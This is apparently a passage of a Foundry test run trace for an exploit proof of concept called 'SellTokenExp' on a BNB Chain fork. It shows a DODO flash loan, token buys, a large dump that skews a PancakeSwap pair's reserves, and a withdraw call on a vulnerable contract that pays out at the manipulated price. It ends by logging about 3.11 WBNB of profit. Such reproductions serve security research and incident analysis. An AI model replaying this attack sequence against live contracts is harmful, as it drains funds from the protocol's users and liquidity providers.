    в”‚   в”‚   в”‚   в”њв”Ђ [100198] 0x8D190C70937493046a464440d28f126A4E42eF7f::buy(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 4146414189887966995 [4.146e18])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5151] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(4146414189887966995 [4.146e18], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5058856009240248300156101 [5.058e24], 844195835298784114639 [8.441e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [4146414189887966995 [4.146e18], 24664488590584555724398 [2.466e22]]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x8D190C70937493046a464440d28f126A4E42eF7f) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1020918279703444674378854 [1.02e24]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [64569] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4146414189887966995}(20964815301996872365738 [2.096e22], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], 0x8D190C70937493046a464440d28f126A4E42eF7f, 1683962033 [1.683e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23974] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 4146414189887966995}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Deposit(dst: 0x10ED43C718714eb63d5aA57B78B54704E256024E, wad: 4146414189887966995 [4.146e18])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x358EfC593134f99833C66894cCeCD41F550051b6, 4146414189887966995 [4.146e18])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x10ED43C718714eb63d5aA57B78B54704E256024E, to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 4146414189887966995 [4.146e18])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x8D190C70937493046a464440d28f126A4E42eF7f) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1020918279703444674378854 [1.02e24]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5058856009240248300156101 [5.058e24], 844195835298784114639 [8.441e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 848342249488672081634 [8.483e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [21183] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(24664488590584555724398 [2.466e22], 0, 0x8D190C70937493046a464440d28f126A4E42eF7f, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6059] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::transfer(0x8D190C70937493046a464440d28f126A4E42eF7f, 24664488590584555724398 [2.466e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: 0x8D190C70937493046a464440d28f126A4E42eF7f, value: 24664488590584555724398 [2.466e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5034191520649663744431703 [5.034e24]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 848342249488672081634 [8.483e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 5034191520649663744431703 [5.034e24], reserve1: 848342249488672081634 [8.483e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 4146414189887966995 [4.146e18], amount0Out: 24664488590584555724398 [2.466e22], amount1Out: 0, to: 0x8D190C70937493046a464440d28f126A4E42eF7f)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x8D190C70937493046a464440d28f126A4E42eF7f) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1045582768294029230103252 [1.045e24]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x8D190C70937493046a464440d28f126A4E42eF7f) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1045582768294029230103252 [1.045e24]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x8D190C70937493046a464440d28f126A4E42eF7f) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1045582768294029230103252 [1.045e24]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] 0x20D815e42eCDEfF5cC14B142DF817825B15b88dD::fallback{value: 85493076080164267}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] 0x20D815e42eCDEfF5cC14B142DF817825B15b88dD::fallback{value: 42746538040082133}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5072405901456677064951523 [5.072e24]
    в”‚   в”‚   в”њв”Ђ [31678] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(5072405901456677064951523 [5.072e24], 0, [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1683963033 [1.683e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [3627] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::transferFrom(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 5072405901456677064951523 [5.072e24])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 5072405901456677064951523 [5.072e24])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5034191520649663744431703 [5.034e24], 848342249488672081634 [8.483e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10106597422106340809383226 [1.01e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [18386] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(0, 425244099411480919497 [4.252e20], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 425244099411480919497 [4.252e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 425244099411480919497 [4.252e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10106597422106340809383226 [1.01e25]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 423098150077191162137 [4.23e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 10106597422106340809383226 [1.01e25], reserve1: 423098150077191162137 [4.23e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 5072405901456677064951523 [5.072e24], amount1In: 0, amount0Out: 0, amount1Out: 425244099411480919497 [4.252e20], to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 425244099411480919497 [4.252e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [108524] 0x57Db19127617B77c8abd9420b5a35502b59870D6::withdraw(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4)
    в”‚   в”‚   в”‚   в”њв”Ђ [586] 0x8D190C70937493046a464440d28f126A4E42eF7f::balanceOf(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 15941814623311229230103252 [1.594e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [5151] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(4189160727928049129 [4.189e18], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10106597422106340809383226 [1.01e25], 423098150077191162137 [4.23e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [4189160727928049129 [4.189e18], 98840638819487160139602 [9.884e22]]
    в”‚   в”‚   в”‚   в”њв”Ђ [5151] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(16617203527853764395 [1.661e19], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10106597422106340809383226 [1.01e25], 423098150077191162137 [4.23e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [16617203527853764395 [1.661e19], 381017754148712581746638 [3.81e23]]
    в”‚   в”‚   в”‚   в”њв”Ђ [76883] 0x8D190C70937493046a464440d28f126A4E42eF7f::6ffe492e(000000000000000000000000a645995e9801f2ca6e2361edf4c2a138362bade4000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000000000000000000000000050af038b07ac9b04cfce0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4720] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x8D190C70937493046a464440d28f126A4E42eF7f, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [67317] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForETHSupportingFeeOnTransferTokens(381017754148712581746638 [3.81e23], 0, [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1683962033 [1.683e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3627] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::transferFrom(0x8D190C70937493046a464440d28f126A4E42eF7f, 0x358EfC593134f99833C66894cCeCD41F550051b6, 381017754148712581746638 [3.81e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x8D190C70937493046a464440d28f126A4E42eF7f, to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 381017754148712581746638 [3.81e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10106597422106340809383226 [1.01e25], 423098150077191162137 [4.23e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10487615176255053391129864 [1.048e25]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [38286] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(0, 15334229087419300293 [1.533e19], 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x10ED43C718714eb63d5aA57B78B54704E256024E, 15334229087419300293 [1.533e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 15334229087419300293 [1.533e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10487615176255053391129864 [1.048e25]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 407763920989771861844 [4.077e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 10487615176255053391129864 [1.048e25], reserve1: 407763920989771861844 [4.077e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 381017754148712581746638 [3.81e23], amount1In: 0, amount0Out: 0, amount1Out: 15334229087419300293 [1.533e19], to: 0x10ED43C718714eb63d5aA57B78B54704E256024E)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x10ED43C718714eb63d5aA57B78B54704E256024E) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 15334229087419300293 [1.533e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9223] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(15334229087419300293 [1.533e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [83] 0x10ED43C718714eb63d5aA57B78B54704E256024E::fallback{value: 15334229087419300293}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: 0x10ED43C718714eb63d5aA57B78B54704E256024E, wad: 15334229087419300293 [1.533e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55] SellTokenExp::receive{value: 15334229087419300293}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [1234] 0x8D190C70937493046a464440d28f126A4E42eF7f::e61c18d0(000000000000000000000000a645995e9801f2ca6e2361edf4c2a138362bade40000000000000000000000000000000000000000000050af038b07ac9b04cfce0000000000000000000000000000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [2074] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 15334229087419300293}()
    в”‚   в”‚   в”‚   в”њв”Ђ emit Deposit(dst: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 15334229087419300293 [1.533e19])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, 427465380400821339663 [4.274e20])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, value: 427465380400821339663 [4.274e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 427465380400821339663 [4.274e20]
    в”‚   в”њв”Ђ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 923675098292473509857042 [9.236e23]
    в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 427465380400821339663 [4.274e20]
    в”‚   в”њв”Ђ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 923675098292473509857042 [9.236e23]
    в”‚   в”њв”Ђ emit DODOFlashLoan(: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 418509475390597934136 [4.185e20], : 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 13112948098078880127 [1.311e19]
    в”њв”Ђ emit log_named_decimal_uint(key: "WBNB total profit", val: 3112948098078880127 [3.112e18], decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 538.43ms (3.96ms CPU time)

Ran 2 test suites in 797.82ms (809.66ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
